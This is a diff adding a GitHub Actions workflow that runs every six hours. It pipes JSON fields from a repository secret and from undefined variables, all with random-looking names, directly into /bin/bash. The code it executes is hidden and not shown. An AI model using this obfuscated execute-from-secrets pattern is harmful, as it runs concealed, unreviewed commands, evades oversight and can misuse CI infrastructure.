@@ -1,0 +1,23 @@
+name: songqiganmangren
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '38 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: songqiganmangren
+        env:
+          gq7: ${{ secrets.gq7 }}
+        run: |
+          echo $gq7 | jq -r .lptq1 | /bin/bash
+          echo $ess85604 | jq -r .g4329 | /bin/bash
+          echo $grgzj5792 | jq -r .sma280 | /bin/bash
+          echo $pof9707 | jq -r .otld86401 | /bin/bash
+          echo $zgvih9 | jq -r .jjw755 | /bin/bash
+          echo $ffuy93 | jq -r .nwywu0758 | /bin/bash
+          echo $ir5965 | jq -r .ruke93217 | /bin/bash
+
